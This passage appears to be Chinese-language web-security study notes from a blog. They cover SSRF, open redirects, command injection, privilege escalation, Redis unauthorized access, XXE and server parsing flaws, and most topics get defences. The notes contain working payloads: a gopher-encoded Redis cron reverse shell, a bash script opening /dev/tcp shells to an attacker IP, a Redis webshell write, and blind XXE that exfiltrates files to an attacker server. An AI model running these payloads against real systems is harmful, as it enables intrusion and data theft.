主机应用识别(可以通过Barner和应用指纹进行识别)</p><p>3.攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)</p><p>4.Payload Result: 返回相应Payload的执行信息</p><p>dict协议探测端口</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=dict://172.0.0.1:22/info'</span></span><br><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=dict://127.0.0.1:6379/info'</span></span><br></pre></td></tr></table></figure><p>利用gopher协议访问redis反弹shell</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'`</span></span><br></pre></td></tr></table></figure><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>1、排除法</p><p>确认目标参数中的URL请求是从客户端发起还是从服务端发起的。</p><p>如：<a href="https://link.jianshu.com?t=http://www.douban.com/" target="_blank" rel="noopener">http://www.douban.com/</a>***/service?image=<a href="https://link.jianshu.com?t=http://www.baidu.com/img/bd_logo1.png" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png</a></p><p><strong>排除法一：</strong></p><p>你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<a href="http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a></p><p><strong>排除法二：</strong></p><p>你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p><h4 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h4><ul><li>禁用不需要的协议，仅仅允许http和https请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</li><li>服务端需要认证交互，禁止非正常用户访问服务；</li><li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li><li>禁止30x跳转</li><li>设置URL白名单或限制内网IP</li></ul><h4 id="gopher-协议"><a href="#gopher-协议" class="headerlink" title="gopher 协议"></a>gopher 协议</h4><p>gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http 协议的前身或简化版，虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://IP:port/_&#123;TCP/IP数据流&#125;</span><br></pre></td></tr></table></figure><h5 id="gopher-协议在ssrf-中的利用"><a href="#gopher-协议在ssrf-中的利用" class="headerlink" title="gopher 协议在ssrf 中的利用"></a>gopher 协议在ssrf 中的利用</h5><p>出现ssrf 的地方如果没有对协议、ip、端口等一些东西进行限制，则可以用来探测内网存活的ip 及开放的端口、读取任意文件、利用phar 协议触发反序列化、攻击内网redis/memcache/mysql 及web 应用fastcgi 或其他服务等等。<br>而gopher 协议在其中占了很重要的角色。</p><p>wireshark抓包，追踪数据流。转换为URL编码。 –&gt; 使用gopher协议发送tcp/ip数据包 </p><h5 id="Gopher攻击内网Redis"><a href="#Gopher攻击内网Redis" class="headerlink" title="Gopher攻击内网Redis"></a>Gopher攻击内网Redis</h5><p><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></p><p>常见redis反弹shell的bash脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 -p $2 flushall</span><br><span class="line">echo -e "\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.86.131/8080 0&gt;&amp;1\n\n"|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure><p>flushall：删除所有数据库中的所有key。这行代码感觉不是很有必要。。。<br>-x参数：从标准输入读取一个参数：<br>在redis的第0个数据库中添加key为1，value为<code>\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n</code>的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。<br>dir 数据库备份的文件放置路径<br>Dbfilename 备份文件的文件名</p><p>执行脚本命令：<code>bash shell.sh 127.0.0.1 6379</code><br>想获取Redis攻击的TCP数据包，可以使用socat进行端口转发，利用这个脚本攻击自身并抓包得到数据流：转发命令如下：<br><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code><br>意思是将本地的4444端口转发到本地的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。<br>然后执行<code>bash shell.sh 127.0.0.1 4444</code> </p><h4 id="file协议和dict协议"><a href="#file协议和dict协议" class="headerlink" title="file协议和dict协议"></a>file协议和dict协议</h4><p><strong>ssrf中利用 file 协议可以读取任意内容</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl file:///var/www/html/ssrf.php</span><br></pre></td></tr></table></figure><p> <strong>dict协议可以进行内网端口探测</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl dict://127.0.0.1:80/info</span><br></pre></td></tr></table></figure><h3 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h3><p>url重定向漏洞也称url任意跳转漏洞，网站信任了用户的输入导致恶意攻击，url重定向主要用来钓鱼，比如url跳转中最常见的跳转在登陆口，支付口，也就是一旦登陆将会跳转任意自己构造的网站，如果设置成自己的url则会造成钓鱼，浅析危害。 </p><h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1. 单斜线&quot;/&quot;绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=/www.evil.com</span><br><span class="line">2. 缺少协议绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=//www.evil.com</span><br><span class="line">3. 多斜线&quot;/&quot;前缀绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=///www.evil.com</span><br><span class="line">https://www.landgrey.me/redirect.php?url=www.evil.com</span><br><span class="line">4. 利用&quot;@&quot;符号绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com</span><br><span class="line">5. 利用反斜线&quot;\&quot;绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me</span><br><span class="line">6. 利用&quot;#&quot;符号绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me</span><br><span class="line">7. 利用&quot;?&quot;号绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me</span><br><span class="line">8. 利用&quot;\\&quot;绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me</span><br><span class="line">9. 利用&quot;.&quot;绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=.evil           (可能会跳转到www.landgrey.me.evil域名)</span><br><span class="line">https://www.landgrey.me/redirect.php?url=.evil.com       (可能会跳转到evil.com域名)</span><br><span class="line">10.重复特殊字符绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=///www.evil.com//..</span><br><span class="line">https://www.landgrey.me/redirect.php?url=www.evil.com//..</span><br></pre></td></tr></table></figure><h4 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 代码固定跳转地址，不让用户控制变量</span><br><span class="line">2. 跳转目标地址采用白名单映射机制</span><br><span class="line">   比如1代表auth.landgrey.me，2代表www.landgrey.me，其它不做任何动作</span><br><span class="line">3. 合理充分的校验校验跳转的目标地址，非己方地址时告知用户跳转风险</span><br></pre></td></tr></table></figure><h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><p>当应用需要调用一些外部程序去处理内容情况下，就会用到一些执行系统命令的函数，比如php中的system、exec、shell_exec、passthru、popen、popc_popen等，当用户调用这些函数时，将恶意系统命令注入到正常命令中，造成命令执行漏洞</p><h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><ol><li>继承权限，执行系统命名，读写文件</li><li>反弹shell</li><li>控制整个服务器</li></ol><h4 id="常见的漏洞利用函数"><a href="#常见的漏洞利用函数" class="headerlink" title="常见的漏洞利用函数"></a>常见的漏洞利用函数</h4><p>System：system函数可以用来执行一个外部的应用程序并将相应的执行结果输出</p><p>Exec：exec函数可以用来执行一个外部的应用程序，</p><p>Passthru：passthru函数可以用来执行一个UNIX系统命令并显示原始的输出，当UNIX系统</p><p>命令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替</p><p>代system与exec函数。</p><p>Shell_exec：执行shell命令并返回输出的字符串</p><p>``运算符：与shell_exec功能相同，执行shell命令并返回输出的字符串。</p><p>Eval函数会将参数字符串作为PHP程序代码来执行，用户可以将PHP代码保存成字符串的形</p><p>式，然后传递给eval函数执行。</p><h4 id="过滤绕过-1"><a href="#过滤绕过-1" class="headerlink" title="过滤绕过"></a>过滤绕过</h4><p> &amp;、||、|符号同样也可以作为命令连接符使用。 </p><p>; 前面的执行完执行后面的 ping 127.0.0.1;whoami   linux</p><p>| 管道符，显示后面的执行结果 ping 127.0.0.1|whoami</p><p>|| 当前面的执行出错时执行后面的 ping 1||whoami</p><p>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami</p><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>PHP内置的两个函数可以有效防止命令执行：</p><p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。</p><p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p><p>php中禁止disable_functions（禁用一些危险函数）</p><p>参数值尽量使用引用号包裹，并在拼接前调用addslashes进行转义</p><h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><p>一个用户A一般只能够对自己本身的信息进行增删改查，然而由于后台开发人员的疏忽，没有在信息进行增删改查时候进行用户判断，从而导致用户A可以对其他用户进行增删改查等等操作。</p><p>越权漏洞，分为水平越权和垂直越权。</p><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权:"></a>水平越权:</h4><p>也可以把其称作访问控制攻击漏洞.Web应用程序在接收到用户的请求时，我们在增删改查某条数据时候，没有判断数据所对应的用户，或者在判断数据的用户时是通过从用户表单参数中获取userid来实现的，这里的话我们可以修改userid来实现水平越权。</p><h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>垂直越权又叫做权限提升攻击，具体原因就是web应用没有做用户权限控制，或者只是在菜单上做了权限控制，导致恶意用户只要猜测到其他管理页面的URL，就可以访问或者控制其他角色拥有的数据或者页面，达到权限提升的目的。</p><h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4><p>1、前后端同时对用户输入信息进行校验，双重验证机制</p><p>2、 执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限</p><p>3、特别敏感操作可以让用户再次输入密码或其他的验证信息。</p><p>4、可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息。</p><p>5、直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理</p><p>6、永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>未授权访问漏洞,是在攻击者没有获取到登录权限或未授权的情况下,不需要输入密码,即可通过输入网站控制台主页面地址或者不允许查看的连接便可进行访问,同时进行操作。</p><p> 常见的未授权访问漏洞</p><blockquote><p>​    1.MongoDB 未授权访问漏洞</p><p>​    2.Redis 未授权访问漏洞</p><p>​    3.Memcached 未授权访问漏洞CVE-2013-7239</p><p>​    4.JBOSS 未授权访问漏洞</p><p>​    5.VNC 未授权访问漏洞</p><p>​    6.Docker 未授权访问漏洞</p><p>​    7.ZooKeeper 未授权访问漏洞</p><p>​    8.Rsync 未授权访问漏洞</p></blockquote><h4 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h4><p>   Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。 </p><p>连接工具 redis clinet  <a href="https://github.com/caoxinyu/RedisClient/releases" target="_blank" rel="noopener">https://github.com/caoxinyu/RedisClient/releases</a> </p><h5 id="利用redis写webshell"><a href="#利用redis写webshell" class="headerlink" title="利用redis写webshell"></a>利用redis写webshell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用前提：</span><br><span class="line">靶机redis未授权，在攻击机能用redis clinet连接，并未登录验证</span><br><span class="line">靶机开启web服务，并且知道网站路径，还需要具有文件读写增删改查权限</span><br></pre></td></tr></table></figure><p>把shell写入/var/www/html/目录下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename test.php</span><br><span class="line">config set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="xxe外部实体注入攻击"><a href="#xxe外部实体注入攻击" class="headerlink" title="xxe外部实体注入攻击"></a>xxe外部实体注入攻击</h3><p> XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。</p><p><a href="https://forum.90sec.com/t/topic/239" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/239</a> </p><h4 id="XML基本文档结构"><a href="#XML基本文档结构" class="headerlink" title="XML基本文档结构"></a>XML基本文档结构</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [ </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DTD</strong> 引用方式(简要了解)</p><p><strong>1. DTD</strong> <strong>内部声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p><strong>2. DTD</strong> <strong>外部引用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;外部DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>3.</strong> <strong>引用公共</strong>DTD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="恶意引入外部实体0x01"><a href="#恶意引入外部实体0x01" class="headerlink" title="恶意引入外部实体0x01"></a>恶意引入外部实体0x01</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接读取php文件会报错，因为php文件里面有&lt;&gt;//等特殊字符，xml解析时候会当成xml语法来解析。 </p><h4 id="恶意引入外部实体0x02"><a href="#恶意引入外部实体0x02" class="headerlink" title="恶意引入外部实体0x02"></a>恶意引入外部实体0x02</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "http://118.25.14.40:8200/hack.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;hhh;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>hack.dtd内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY hhh SYSTEM &apos;file:///etc/passwd&apos;&gt;</span><br></pre></td></tr></table></figure><p>与SQL相似，XXE漏洞也分为有回显和无回显<br>有回显，可以直接在页面中看到payload的执行结果或现象。<br>无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p><p>遇到无回显，可以通过<code>Blind XXE</code>方法加上外带数据通道来提取数据，先使用<code>php://filter</code>协议获取目标文件的内容，然后将内容以<code>http</code>请求发送到攻击服务器来读取数据。虽无法直接查看文件内容，但我们可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。即，当无回显情况时，可以将数据发送到远程服务器(攻击服务器)。</p><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/qwzf.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.201.128/evil.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>远程服务器部署evil.dtd内容为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &apos;http://192.168.201.128/?content=%file;&apos;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure><p>%要进行实体编码<code>&amp;#x25</code><br>进行XXE攻击后，服务器会把文件内容发送到攻击者服务器</p><p>无回显攻击流程：</p><ul><li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</li><li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li><li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</li></ul><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ol><li>禁用外部实体</li><li>过滤和验证用户提交的xml数据</li><li>不允许xml中含有任何自己声明的dtd</li></ol><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p><a href="https://www.cnblogs.com/shellr00t/p/6426856.html" target="_blank" rel="noopener">https://www.cnblogs.com/shellr00t/p/6426856.html</a></p><p><img src="/2019/12/14/%E7%AC%94%E8%AE%B0/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.jpg" alt></p><h4 id="一、Apache解析漏洞"><a href="#一、Apache解析漏洞" class="headerlink" title="一、Apache解析漏洞:"></a>一、Apache解析漏洞:</h4><ol><li>abc.php.xxx.xx.xx(那么这个文件会被apache容器解析成php文件，因为apache解析文件名的步骤是从文件末尾开始找文件后缀名，见到xx。不认识，之后继续向前找，xxx.也不认识，继续向前，当走到.php的时候，认识这个后缀，并解析这个后缀)</li><li>.htaccess</li><li>若此文件中输入对应的代码，那么该文件目录下的所有文件将以php文件来执行</li></ol><h4 id="二、IIS6-0解析漏洞"><a href="#二、IIS6-0解析漏洞" class="headerlink" title="二、IIS6.0解析漏洞"></a>二、IIS6.0解析漏洞</h4><ol><li>asp;1.jpg（会将1.jpg解析成asp文件格式）</li><li>abc.asp/time.jpg(abc.asp是个目录，iis6.0会将这个目录下的文件按照asp方式进行解析)</li></ol><h4 id="三、IIS-7-0-amp-7-5畸形解析漏洞"><a href="#三、IIS-7-0-amp-7-5畸形解析漏洞" class="headerlink" title="三、IIS 7.0&amp;7.5畸形解析漏洞"></a>三、IIS 7.0&amp;7.5畸形解析漏洞</h4><ol><li>默认fast-cgi开启状况下，在一个文件路径后面加上/xx.php会将原来的文件解析为php文件</li></ol><h4 id="四、Nginx解析漏洞"><a href="#四、Nginx解析漏洞" class="headerlink" title="四、Nginx解析漏洞"></a>四、Nginx解析漏洞</h4><ol><li><p>畸形解析漏洞</p><ul><li>默认fast-cgi开启状况下，在一个文件路径后面加上/xx.php会将原来的文件解析为php文件</li></ul></li><li><p>空字节代码执行漏洞</p><ul><li><p>在fast-cgi关闭的情况下，nginx版本:0.5., 0.6., 0.7- 0.7.65, 0.8 -0.8.37，nginx在图片后附加php代码然后通过访问</p><p>例如：xx.jpg%00.php</p></li></ul></li><li><p>文件名逻辑漏洞(CVE-2013-4547)</p><ul><li><p>受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x</p><p>正常上传一个附加代码的图片”test.jpg”，访问时后面+”空格”+”\0”+”.php”，即让图片作为php文件解析</p><p>例如：/test.jpg \0.php</p></li></ul></li></ol><h2 id="获取交互式shell"><a href="#获取交互式shell" class="headerlink" title="获取交互式shell"></a>获取交互式shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
